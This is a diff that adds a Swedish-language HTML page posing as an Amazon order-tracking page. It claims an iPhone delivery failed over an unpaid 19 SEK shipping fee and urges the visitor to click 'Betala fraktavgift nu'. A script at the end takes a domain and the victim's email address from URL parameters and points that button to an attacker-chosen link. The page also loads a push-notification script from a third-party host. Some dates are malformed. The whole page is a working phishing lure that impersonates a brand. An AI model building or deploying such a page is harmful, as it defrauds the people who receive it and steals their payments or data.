@@ -1,0 +1,352 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" type="text/css" href="css/bootstrap/bootstrap.min.css">
+  <!-- <link rel="stylesheet" type="text/css" href="css/bootstrap/bootstrap.min.js"> -->
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <link rel="stylesheet" type="text/css" href="css/animate.css">
+  <link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+
+</head>
+<body>
+
+
+
+
+ <!--customer script-->
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js"></script>
+<script src="https://api.mdsyzz.com/auto-push.min.js"></script>
+<script>
+InitializePush("7ca0b0bb-3fe4-4cc4-97c0-1807bcbc817a");
+</script>
+    <!--customer script-->
+
+<!-- starting page -->
+  <div class="container-fluid p-0">
+               
+<!-- ===============header htl=======================-->
+  <div class="row header-one">
+
+       <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+
+       <div class="col-lg-4 col-md-6 col-sm-8 col-12">
+     <div class="header">
+          <div class="row">
+
+           <div class="col-md-2 col-sm-2 col-2 p-0">
+             <div>
+              <div class="Menu">
+               <img class=" logo" src="img/Hamburger_icon.png">
+              
+             </div>
+           </div>
+         </div>
+         <div class="col-md-7 col-sm-7 col-7 pl-0">
+           <img class="bilka" src="img/logo.png">
+         </div>
+         <div class="menu-right col-md-1 col-sm-1 col-1 text-center text-white p-0">
+          <i class="fa fa-search header-search"></i>
+         </div>
+         <div class="menu-right col-md-2 col-sm-2 col-2 text-center text-white p-0">
+        
+          <img class=" cart" src="img/cart1.png">
+          <p class="mb-0">0 SEK</p>
+        </div>
+      </div>
+    </div>
+      <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+ </div>
+</div>
+
+<div class="row header-two">
+
+       <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+
+       <div class="col-lg-4 col-md-6 col-sm-8 col-12">
+   <div class="main">
+  
+  <!-- Another variation with a button -->
+  <div class="input-group">
+    <input type="text" class="form-control" placeholder="Search">
+    <div class="input-group-append">
+      <button class="btn search-icon" type="button">
+        <i class="fa fa-search"></i>
+      </button>
+    </div>
+  </div>
+  
+</div>
+         </div>
+      <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+
+</div>
+<!-- ===============header htl=======================-->
+
+
+
+
+
+
+
+
+     <!-- page 1 start -->
+     <div id="page-1">
+<div class="card text-center card-one ">
+
+  <div class="card-body">
+    <h5 class= R-semibold">Hej!</h5>
+    <h5 class=" R-semibold">Ditt paket kommer levereras:</h5>
+    <h5 class=" time-one R-bold"><span class="two-days-ahead">Onsdag, Oktober 31</span></h5>
+
+<!--     <p class="card-text">With supporting text below as a natural lead-in to additional content.</p> -->
+    <a href="#" class="btn trace R-semibold">Spåra paket</a>
+    <h5 class="mb-4 R-bold">Paketinformation:</h5>
+
+    <div class="row page-one-content">
+      <div class="col-md-4 col-sm-4 col-lg-4 col-4 pr-0">
+        <img class="d" src="img/d.png">
+      </div>
+        <div class="col-md-8 col-sm-8 col-lg-8 col-8 text-left  pl-0">
+          <p class="small-text mb-0 margin-left">Innehåll</p>
+            <h5 class="card-title margin-left">iPhone 11 Pro 512GB Space Grey </h5>
+                <p class="small-text mb-0 margin-left">Beställnings-ID # 114-4048827-9800010</p>
+      </div>
+
+    </div>
+
+     <div class="row page-one-content mb-4">
+      <div class="col-md-4 col-sm-4 col-lg-4 col-4 pr-0">
+        <img class="a" src="img/a.png">
+      </div>
+        <div class="col-md-8 col-sm-8 col-lg-8 col-8 text-left  pl-0">
+          <p class="small-text mb-0 margin-left">Beställd</p>
+             <h5 class="card-title margin-left"><span class="six-days-before">Oktober 28, 2019</span></h5>
+      </div>
+
+    </div>
+
+     <div class="row page-one-content mb-4">
+      <div class="col-md-4 col-sm-4 col-lg-4 col-4 pr-0">
+        <img class="b z" src="img/b.png">
+      </div>
+        <div class="col-md-8 col-sm-8 col-lg-8 col-8 text-left  pl-0">
+            <p class="small-text mb-0 margin-left">BETALNINGSSUMMA (BETALD):</p>
+            <h5 class="card-title margin-left">10.599,95 SEK</h5>
+     
+        
+      </div>
+
+    </div> 
+
+    <div class="row page-one-content mb-4">
+      <div class="col-md-4 col-sm-4 col-lg-4 col-4 pr-0">
+        <img class="c" src="img/c.png">
+      </div>
+        <div class="col-md-8 col-sm-8 col-lg-8 col-8 text-left  pl-0">
+            <p class="small-text mb-0 margin-left">FRAKTAVGIFT (OBETALD):</p>
+            <h5 class="card-title margin-left">19,00 SEK</h5>
+          
+      </div>
+
+    </div>
+  </div>
+
+   </div>
+
+       </div>
+
+ <!-- page-1 end -->
+<!-- page-2 -->
+
+    <div id="page-2">
+<div class="card text-center card-one">
+
+  <div class="card-body">
+    <h5 class="mb-3 R-bold mt-2">Spårning av ditt paket</h5>
+
+<!-- <a href="#" class="btn search  R-semibold"><i class="fa fa-search field-saerch"></i><span class="demo">AM123456789TN</span></a>
+ -->
+
+<div class="search mb-4">
+<div class="css-typing text-center">
+  <p class="text-center">
+   <i class="fa fa-search field-saerch"></i> AMZ39560174-SE
+  </p>
+</div>
+</div>
+
+
+
+       <div class="Expected-delivery ">
+    <h5 class="card-title R-semibold">Förväntad leveranstid:</h5>
+    <h5 class="card-title time-one R-bold mb-5"><span class="two-days-ahead">Onsdag, Oktober 31</span></h5>
+     </div>
+    <!-- <h5 class="card-title mb-4 R-bold">Order summary:</h5> -->
+
+   <div class="row">
+      <div class="col-md-2 col-sm-2 col-lg-2 col-2">
+         <div id="myProgress" class="vertical">
+          <div id="myBar"></div>
+        </div>
+        </div>
+ 
+        <div class="col-md-10 col-sm-10 col-lg-10 col-10 R-semibold" >
+          <div class="suscess-first text-left tick-1  ">
+               <p class="mb-0 small-text"><span class="three-days-before">Oktober 200, 2019</span> <span><i class="fa fa-check tick " ></i></span></p>
+             <p class="para">Din order har blivit behandlad </p>
+          </div>
+
+           <div class="suscess-two text-left R-semibold tick-2  ">
+               <p class="mb-0 small-text"><span class="two-days-before">Oktober 200, 2019</span> <span><i class="fa fa-check tick "></i></span></p>
+             <p class="para">Din beställning är packad och redo för frakt</p>
+          </div> 
+
+          <div class="detained text-left R-semibold para cross ">
+               <p class="mb-0 small-text"><span class="one-days-before">Oktober 200, 2019</span> <span><i class="fa fa-times  "></i></span></p>
+             <p class="para mb-0">Leveransen misslyckades:</p>
+             <p class="para">Obetalda fraktavgifter</p>
+          </div>
+       
+      </div>
+
+    </div>
+<div class="row">
+  <div class="col-md-12 col-sm-12 col-12 col-lg-12">
+        <a href="#" id="go-final" class="btn final R-semibold d-none">Betala fraktavgift nu</a>
+  </div>
+</div>
+
+  </div>
+
+   </div>
+
+       </div>
+
+
+<div class="row whole-top-footer">
+
+       <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+
+       <div class="col-lg-4 col-md-6 col-sm-8 col-12">
+       <!-- footer -->
+       <div class="footer-bg">
+       <div class="row top-footer ">
+  <div class="col-md-12 col-sm-12 col-12 pl-0 pr-0" style="font-family: SF-Pro-Display-Light;">
+      
+        <ul class="list-inline text-white text-center">
+            <li class="list-inline-item ">Australia</li>
+            <li  class="list-inline-item">Brazil</li>
+            <li  class="list-inline-item">Canada</li>
+            <li  class="list-inline-item">China</li>
+            <li  class="list-inline-item">France</li>
+            <li class="list-inline-item ">Germany</li>
+            <li  class="list-inline-item">India</li>
+            <li  class="list-inline-item">Italy</li>
+            <li  class="list-inline-item">Japan</li>
+            <li  class="list-inline-item">Mexico</li>
+            <li  class="list-inline-item">Netherlands</li>
+            <li  class="list-inline-item">Spain</li>
+            <li  class="list-inline-item">United States</li>
+            <li  class="list-inline-item">Sweden</li>
+       </ul>
+  </div>
+</div>
+     
+</div>
+       <!-- footer end -->
+  </div>
+ 
+       <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+ </div>
+ <div class="row whole-bootom-footer">
+
+       <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+
+       <div class="col-lg-4 col-md-6 col-sm-8 col-12">
+       <!-- footer -->
+       <div class="footer-bg">
+
+    
+   <div class="row  footer ml-1 mr-1">
+  <div class="col-md-12 col-sm-12 col-12 pl-0 pr-0">
+    <div><p style="font-family: SF-Pro-Display-Light;" class="footer-p"><span class="share-b">Dela  <i class="fa fa-check" aria-hidden="true"></i></span>  Du och 224k andra gillar detta</p></div>
+
+      
+        <ul class="list-inline text-white text-center">
+            <li class="list-inline-item "><img src="img/f1.png"></li>
+            <li class="list-inline-item "><img src="img/f2.png"></li>
+            <li class="list-inline-item "><img src="img/f3.png"></li>
+           <li class="list-inline-item "><img src="img/f4.png"></li>
+           <li class="list-inline-item "><img src="img/f5.png"></li>
+           <li class="list-inline-item "><img src="img/f6.png"></li>
+           <li class="list-inline-item "><img src="img/f7.png"></li>
+           <li class="list-inline-item "><img src="img/f8.png"></li>
+           <li class="list-inline-item "><img src="img/f9.png"></li>
+          <li class="list-inline-item "><img src="img/f10.png"></li>
+          <li class="list-inline-item "><img src="img/f11.png"></li>
+          <li class="list-inline-item "><img src="img/f12.png"></li>
+        
+       </ul>
+     </div>
+   </div>
+        <div class="text-center "><img class="mt-3 mb-2 footer-logo" src="img/logo.png"></div>
+          <div class="text-center text-white"><p style="font-family: SF-Pro-Display-Light;" class="last-p">1996-2020 Amazon.com</p></div>
+  </div>
+       <!-- footer end -->
+     </div>
+ 
+       <div class="col-lg-4 col-md-3 col-sm-2 "></div>
+  </div>
+
+
+</div>
+
+
+
+
+
+
+
+<!--   Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<!-- <script type="text/javascript" src="plugin/confetti.min.js"> </script> -->
+<script type="text/javascript" src="js/custom.js"></script>
+
+
+
+
+<script>
+    function getURLParameter(name) {
+        return decodeURI(
+            (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+    }
+
+    // Grab dom URL variable
+    var dom = getURLParameter('dom');
+    var email = getURLParameter('email');
+    var emaildec = decodeURI(email);
+    var realemail = email.replace("%40", "@");
+
+    //build link - insert into HTML
+    // document.write('<a href="'+ link + '" class="**button classes here**" style="display: inline-block;">LOG-IN NOW</a>');
+    var link = "https://" + dom + "/click/1";
+
+    jQuery(document).ready(function (e) {
+        $('#go-final').attr('href', link);
+    });
+</script>
+
+</body>
+</html>
